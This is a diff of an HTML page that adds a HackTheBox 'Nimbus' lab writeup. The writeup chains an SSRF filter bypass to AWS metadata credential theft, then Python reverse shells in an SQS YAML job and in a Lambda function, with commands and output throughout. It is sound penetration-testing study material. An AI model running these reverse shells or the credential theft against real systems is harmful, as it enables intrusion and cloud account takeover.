@@ -6,77 +6,297 @@
     <title>Nimbus • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0b0d15;
-            color: #e0e5f0;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 2rem;
-        }
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background: rgba(12, 16, 28, 0.9);
-            border: 1px solid rgba(0, 255, 200, 0.15);
-            border-radius: 2rem;
-            padding: 3rem;
-            text-align: center;
-            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
-        }
-        h1 {
-            font-size: 2.5rem;
-            color: #6fffe0;
-            margin-bottom: 1rem;
-        }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
-            border-radius: 1rem;
-        }
-        .status i {
-            color: #ffcc00;
-            margin-right: 0.5rem;
-        }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
-            border-radius: 1rem;
-            color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
-        }
+        body { background: #0b0d15; color: #e0e5f0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .container { max-width: 1200px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; white-space: pre; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB Nimbus</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+<div class="container">
+    <div class="meta-info">
+        <span><strong>Platform:</strong> HackTheBox</span>
+        <span><strong>Difficulty:</strong> Hard</span>
+        <span><strong>OS:</strong> Linux</span>
+        <span><strong>Domain:</strong> nimbus.htb, aws.nimbus.htb</span>
+        <span><strong>Tech Stack:</strong> nginx, LocalStack, SQS, Lambda, S3</span>
     </div>
+
+    <h1>Nimbus — HackTheBox Writeup</h1>
+
+    <h2>🗺️ Attack Chain Overview</h2>
+    <div class="attack-chain">URL fetch feature → SSRF (decimal-encoded IP + query string bypass)
+   → AWS IMDS via http://2852039166/latest/meta-data/
+   → IAM temporary credentials (nimbus-web-role)
+   → AWS CLI → SQS queue discovery
+   → Send YAML job with Python reverse shell → worker container shell
+   → Container environment → new AWS credentials
+   → S3 write access → Lambda function creation (reverse shell)
+   → Root in Lambda container
+   → Host escalation: TBD</div>
+
+    <h2>🔍 1. Reconnaissance</h2>
+    <pre><code>nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent
+nmap -sVC -p22,80 -oN service</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://nimbus.htb/</code></pre>
+
+    <pre><code>echo "$TARGET nimbus.htb aws.nimbus.htb" | sudo tee -a /etc/hosts</code></pre>
+
+    <h2>🌐 2. Web Fuzzing</h2>
+    <pre><code>feroxbuster -u http://nimbus.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>200  GET  http://nimbus.htb/login
+200  GET  http://nimbus.htb/jobs
+200  GET  http://nimbus.htb/api/v1/health
+200  GET  http://nimbus.htb/
+405  GET  http://nimbus.htb/jobs/preview</code></pre>
+
+    <p><strong>Key findings:</strong></p>
+    <ul>
+        <li><code>/jobs</code> — accepts unauthenticated job submissions during the migration window.</li>
+        <li><code>/jobs/preview</code> — takes a URL as input, fetches it, and returns the content. <strong>Classic SSRF candidate.</strong></li>
+        <li>Login page leaks a username: <code>marcus</code>.</li>
+    </ul>
+
+    <h2>🔓 3. SSRF via URL Fetch — AWS Metadata</h2>
+    <p>The <code>/jobs/preview</code> URL fetch feature validated input by checking for a <code>.yaml</code> or <code>.yml</code> suffix. This was bypassed by:</p>
+    <ol>
+        <li>Using a decimal-encoded IP address instead of dotted notation.</li>
+        <li>Moving the required <code>.yaml</code> suffix into the query string.</li>
+    </ol>
+    <pre><code>http://2130706433/   =  http://127.0.0.1
+http://2852039166/   =  the AWS metadata IP (169.254.169.254)</code></pre>
+
+    <pre><code>curl -X POST http://nimbus.htb/jobs/preview \
+  -d "url=http://2852039166/latest/meta-data/?foo=.yaml" \
+  -H "Content-Type: application/x-www-form-urlencoded"</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>ami-id
+hostname
+iam/
+instance-id
+instance-type
+local-hostname
+local-ipv4
+placement/
+security-groups</code></pre>
+
+    <div class="box success">
+        <p>The IMDS (Instance Metadata Service) was reachable. The <code>iam/</code> path indicates IAM role credentials are available.</p>
+    </div>
+
+    <h2>🔑 4. AWS Credential Extraction and SQS Discovery</h2>
+
+    <h3>Read IAM Credentials via SSRF</h3>
+    <pre><code>curl -X POST http://nimbus.htb/jobs/preview \
+  -d "url=http://2852039166/latest/meta-data/iam/security-credentials/?foo=.yaml" \
+  -H "Content-Type: application/x-www-form-urlencoded"
+# nimbus-web-role
+
+curl -X POST http://nimbus.htb/jobs/preview \
+  -d "url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?foo=.yaml" \
+  -H "Content-Type: application/x-www-form-urlencoded"</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>{
+  "Code": "Success",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "<AWS_ACCESS_KEY_ID>",
+  "SecretAccessKey": "<AWS_SECRET_ACCESS_KEY>",
+  "Token": "<AWS_SESSION_TOKEN>",
+  "Expiration": "2026-06-21T19:38:34Z"
+}</code></pre>
+
+    <h3>Configure AWS CLI</h3>
+    <pre><code>export AWS_ACCESS_KEY_ID="<AWS_ACCESS_KEY_ID>"
+export AWS_SECRET_ACCESS_KEY="<AWS_SECRET_ACCESS_KEY>"
+export AWS_SESSION_TOKEN="<AWS_SESSION_TOKEN>"
+export AWS_DEFAULT_REGION="us-east-1"
+
+sudo timedatectl set-ntp true
+sudo ntpdate -u pool.ntp.org</code></pre>
+
+    <h3>Discover SQS Queues</h3>
+    <pre><code>aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
+aws --endpoint-url http://aws.nimbus.htb sqs list-queues</code></pre>
+
+    <p><strong>Output:</strong></p>
+    <pre><code>{
+  "QueueUrls": [
+    "http://floci:4566/847219365028/nimbus-jobs"
+  ]
+}</code></pre>
+
+    <h2>💻 5. Reverse Shell via SQS YAML Job</h2>
+    <p>The queue processes YAML job definitions with an embedded Python <code>script</code> field.</p>
+
+    <pre><code>nc -lvnp 4444
+
+cat > rev.yaml << 'EOF'
+name: test-revshell
+schedule: "* * * * *"
+runtime: python3.11
+script: |
+  import socket,subprocess,os
+  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+  s.connect(("10.10.15.26",4444))
+  os.dup2(s.fileno(),0)
+  os.dup2(s.fileno(),1)
+  os.dup2(s.fileno(),2)
+  subprocess.call(["/bin/bash","-i"])
+EOF
+
+aws --endpoint-url http://aws.nimbus.htb sqs send-message \
+    --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
+    --message-body file://rev.yaml</code></pre>
+
+    <div class="box success">
+        <p>Reverse shell received. Initial access as <code>worker</code> in a container.</p>
+    </div>
+
+    <h2>🔍 6. Container Enumeration</h2>
+    <pre><code>cat /home/worker/user.txt
+
+id
+# uid=1000(worker) gid=1000(worker) groups=1000(worker)
+
+hostname
+# f42e760d8943
+
+cat /proc/1/status | grep Cap
+# CapPrm: 0000000000000000
+# CapEff: 0000000000000000
+# CapBnd: 00000000a80425fb</code></pre>
+
+    <div class="box warning">
+        <p>Zero effective capabilities — the container is not privileged. Standard container escape paths are unavailable.</p>
+    </div>
+
+    <h3>Environment Contains New AWS Credentials</h3>
+    <pre><code>env</code></pre>
+    <pre><code>HOSTNAME=f42e760d8943
+AWS_ENDPOINT_URL=http://aws.nimbus.htb
+AWS_DEFAULT_REGION=us-east-1
+AWS_ACCESS_KEY_ID=<AWS_ACCESS_KEY_ID>
+AWS_SECRET_ACCESS_KEY=<AWS_SECRET_ACCESS_KEY>
+QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs</code></pre>
+
+    <h3>Internal Network</h3>
+    <pre><code>cat /etc/hosts</code></pre>
+    <pre><code>172.18.0.1  aws.nimbus.htb
+172.18.0.1  nimbus.htb
+172.18.0.3  f42e760d8943</code></pre>
+
+    <h2>☁️ 7. Internal AWS Enumeration</h2>
+    <pre><code>aws --endpoint-url http://172.18.0.2:4566 sts get-caller-identity
+aws --endpoint-url http://172.18.0.2:4566 s3 ls
+aws --endpoint-url http://172.18.0.2:4566 iam list-users
+aws --endpoint-url http://172.18.0.2:4566 lambda list-functions</code></pre>
+
+    <h3>S3 Write Access Confirmed</h3>
+    <pre><code>aws --endpoint-url http://172.18.0.2:4566 s3 cp /etc/hostname s3://nimbus-dev-artifacts/test.txt
+aws --endpoint-url http://172.18.0.2:4566 s3 ls s3://nimbus-dev-artifacts/</code></pre>
+
+    <div class="box success">
+        <p>Write access to <code>nimbus-dev-artifacts</code> bucket → can upload and deploy Lambda function code.</p>
+    </div>
+
+    <h2>🚀 8. Lambda Escape — Root in Lambda Container</h2>
+
+    <h3>Create the Lambda Payload</h3>
+    <pre><code>cat > /tmp/lambda_function.py << 'EOF'
+import socket,subprocess,os
+
+def handler(event, context):
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("10.10.14.201",6666))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    subprocess.call(["/bin/bash","-i"])
+    return {"status": "ok"}
+EOF
+cd /tmp && zip shell.zip lambda_function.py</code></pre>
+
+    <h3>Create IAM Execution Role</h3>
+    <pre><code>aws --endpoint-url http://172.18.0.2:4566 iam create-role \
+    --role-name lambda-exec \
+    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"lambda.amazonaws.com"},"Action":"sts:AssumeRole"}]}'</code></pre>
+
+    <h3>Deploy and Invoke the Lambda Function</h3>
+    <pre><code>aws --endpoint-url http://172.18.0.2:4566 lambda create-function \
+    --function-name escape2 \
+    --runtime python3.11 \
+    --role arn:aws:iam::847219365028:role/lambda-exec \
+    --handler lambda_function.handler \
+    --zip-file fileb:///tmp/shell.zip
+
+aws --endpoint-url http://172.18.0.2:4566 lambda update-function-configuration \
+    --function-name escape2 \
+    --timeout 60000
+
+nc -lvnp 6666
+
+aws --endpoint-url http://172.18.0.2:4566 lambda invoke \
+    --function-name escape2 \
+    --payload '{}' /tmp/out.json</code></pre>
+
+    <p><strong>Result:</strong></p>
+    <pre><code>whoami
+# root
+cat /etc/hostname
+# f207a05b6bc9</code></pre>
+
+    <div class="box success">
+        <p>Root access in the Lambda container (<code>f207a05b6bc9</code>).</p>
+    </div>
+
+    <div class="box warning">
+        <p><strong>Status:</strong> host escalation from the Lambda container is still in progress.</p>
+    </div>
+
+    <h2>🧠 9. Key Takeaways</h2>
+    <ul>
+        <li><strong>SSRF + decimal-encoded IPs bypass naive allow-lists.</strong> URL validators that check for <code>.yaml</code> suffixes or block <code>127.0.0.1</code> are trivially bypassed with decimal notation (<code>2130706433</code>) and query-string suffix anchoring (<code>?foo=.yaml</code>).</li>
+        <li><strong>AWS IMDS is the crown jewel of cloud SSRF.</strong> If a URL fetcher can reach <code>169.254.169.254</code>, the IAM credentials are immediately weaponizable.</li>
+        <li><strong>SQS queues are an unexpected RCE surface.</strong> A job scheduler that processes YAML from an SQS queue and executes the <code>script</code> field directly is functionally equivalent to a scheduled command injection.</li>
+        <li><strong>Container environment variables expose internal secrets.</strong> <code>env</code> is always one of the first commands to run after landing in a container.</li>
+        <li><strong>LocalStack AWS services are often under-permissioned.</strong> Always enumerate available service actions even if they seem restricted.</li>
+    </ul>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
 </body>
 </html>
